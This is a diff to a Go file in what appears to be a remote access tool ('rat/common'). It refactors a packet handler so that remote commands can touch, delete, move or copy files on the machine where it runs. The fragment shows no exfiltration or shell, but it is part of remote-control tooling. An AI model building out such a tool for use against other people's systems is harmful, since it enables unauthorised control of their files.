@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"io"
 	"os"
 	"path/filepath"
 	"rat/common"
@@ -10,38 +9,18 @@ import (
 )
 
 type FilePacket struct {
+	File        string `receive`
+	Task        int    `receive`
+	Destination string `receive`
 }
 
-func copyfile(from, to string) error {
-	src, err := os.Open(from)
-	defer src.Close()
-	if err != nil {
-		return err
-	}
-
-	dest, err := os.Create(to)
-	defer dest.Close()
-	if err != nil {
-		return err
-	}
-
-	io.Copy(dest, src)
-
-	return nil
-}
-
-func (packet FilePacket) GetHeader() common.PacketHeader {
+func (packet FilePacket) Header() common.PacketHeader {
 	return common.FileHeader
 }
 
-func (packet FilePacket) Write(c *Connection) error {
-	return nil
-}
-
-func (packet FilePacket) Read(c *Connection) error {
-	file, _ := c.ReadString()
-	t, err := c.ReadInt()
-	task := common.FileTask(t)
+func (packet FilePacket) OnReceive() error {
+	file := packet.File
+	task := common.FileTask(packet.Task)
 
 	switch task {
 	case common.Touch:
@@ -55,7 +34,7 @@ func (packet FilePacket) Read(c *Connection) error {
 		defer os.RemoveAll(file)
 		fallthrough
 	case common.Copy:
-		dest, _ := c.ReadString()
+		dest := packet.Destination
 		stat, _ := os.Stat(file)
 
 		if stat.IsDir() {
@@ -69,5 +48,5 @@ func (packet FilePacket) Read(c *Connection) error {
 		}
 	}
 
-	return err
+	return nil
 }
